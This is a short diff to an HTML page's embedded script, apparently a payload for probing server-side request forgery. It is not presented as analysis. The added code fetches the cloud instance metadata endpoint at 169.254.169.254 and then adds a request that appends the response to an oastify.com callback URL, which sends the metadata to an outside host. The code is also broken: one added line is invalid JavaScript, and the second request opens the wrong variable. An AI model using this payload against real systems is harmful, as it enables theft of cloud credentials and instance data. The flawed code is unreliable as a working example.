@@ -2,11 +2,13 @@
   <head>
     <script>
 
-// Create a new XMLHttpRequest object
+var http://169.254.169.254/latest/meta-data/
+
+  
 var xhr = new XMLHttpRequest();
 var x = "Test"
 // Define the URL with the variable value
-var url = 'https://2cfsk8dogvtsfajf0u6ff2da61cs0vok.oastify.com?variableName=' + x;
+var url = 'http://169.254.169.254/latest/meta-data/';
 // Open a new GET request
 xhr.open('GET', url, true);
 
@@ -14,7 +16,14 @@ xhr.open('GET', url, true);
 xhr.onload = function () {
   if (xhr.status >= 200 && xhr.status < 300) {
     // Request was successful, handle the response here
-    console.log(xhr.responseText);
+   // console.log(xhr.responseText);
+  var xhr1 = new XMLHttpRequest();
+  var x1 = "Test"
+  // Define the URL with the variable value
+  var url1 = 'https://2cfsk8dogvtsfajf0u6ff2da61cs0vok.oastify.com?variableName=' + xhr.responseText;
+  // Open a new GET request
+  xhr1.open('GET', url, true);
+  xhr1.send();
   } else {
     // Request failed
     console.error('Request failed with status: ' + xhr.status);
